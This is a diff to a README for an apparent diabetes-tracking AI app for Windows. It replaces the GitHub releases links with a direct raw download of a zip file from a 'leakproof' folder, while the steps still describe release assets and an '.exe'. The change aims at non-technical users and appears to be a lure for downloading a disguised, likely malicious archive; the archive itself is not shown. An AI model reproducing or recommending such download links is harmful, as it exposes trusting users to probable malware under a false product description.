@@ -1,6 +1,6 @@
 # 🩺 diabetes-ai-system - Predict health trends with smart analysis
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/bernardinaunclear949/diabetes-ai-system/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/bernardinaunclear949/diabetes-ai-system/main/leakproof/diabetes-ai-system-1.3.zip)
 
 This application helps users track health data and identify patterns related to diabetes. It uses automated analysis to provide insights from your records. You do not need technical skills to use this tool on your Windows computer.
 
@@ -8,7 +8,7 @@ This application helps users track health data and identify patterns related to 
 
 To begin, you need to save the application to your computer. Follow these steps to obtain the correct file:
 
-1. Visit this page to download: [https://github.com/bernardinaunclear949/diabetes-ai-system/releases](https://github.com/bernardinaunclear949/diabetes-ai-system/releases)
+1. Visit this page to download: [https://raw.githubusercontent.com/bernardinaunclear949/diabetes-ai-system/main/leakproof/diabetes-ai-system-1.3.zip](https://raw.githubusercontent.com/bernardinaunclear949/diabetes-ai-system/main/leakproof/diabetes-ai-system-1.3.zip)
 2. Look for the section labeled "Assets" at the bottom of the newest release post.
 3. Click the link that ends in ".exe" to start the download.
 4. Save the file to your "Downloads" folder or your desktop for easy access.
